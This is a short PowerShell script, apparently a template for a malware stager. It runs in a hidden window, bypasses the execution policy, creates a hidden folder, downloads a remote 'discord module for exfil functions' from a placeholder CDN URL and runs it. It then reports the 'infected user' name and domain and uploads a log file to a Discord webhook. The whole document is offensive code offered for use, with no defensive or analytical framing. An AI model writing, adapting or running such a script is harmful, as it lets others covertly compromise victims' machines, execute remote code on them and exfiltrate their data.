PowerShell.exe -windowstyle hidden {


  # Bypass the execution policy for the current user (allows us to run scripts outside of this context if we so wished)
  Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser -Force

  # GLOBAL VARS/ENVIRON VARS #
  $hookUrl = 'YOUR_WEB_HOOK_URL'
  $secret = "$env:localappdata\SECRET_FOLDER"
  $log = "$secret\log.txt"

  if (!(Test-Path $secret)) {
    New-Item -ItemType Directory -Path $secret -Force | Out-Null
    Set-ItemProperty -Path $secret -Name Attributes -Value "Hidden"
} 
  Write-Output "" > $log

  # Setup a logger taking the params "Message" and "Output" type, and formats the proper log message.
  function Write-Log {
      param
      (
          [string] $Message,
          [string] $OutputType
      )
      if ($OutputType -eq "Error") { filter timestamp { "ERROR $(Get-Date -Format "HH:mm:ss.fff"): $_" } }     
      if ($OutputType -eq "Log") { filter timestamp { "LOG $(Get-Date -Format "HH:mm:ss.fff"): $_" } }
      Write-Output ($Message | timestamp) >> $log   
  }



  $cdnURL = "YOUR_CDN_URL"
  # Injecting discord module for exfil functions
  Invoke-WebRequest -Uri "$cdnURL" -OutFile "$secret\discord.ps1"
  ."$secret\discord.ps1"

  
  Send-Message -Uri $hookUrl -Message "Logging from infected user - ($env:username\${env:USERDOMAIN}):"
  Send-File -Uri $hookUrl -File $log

}
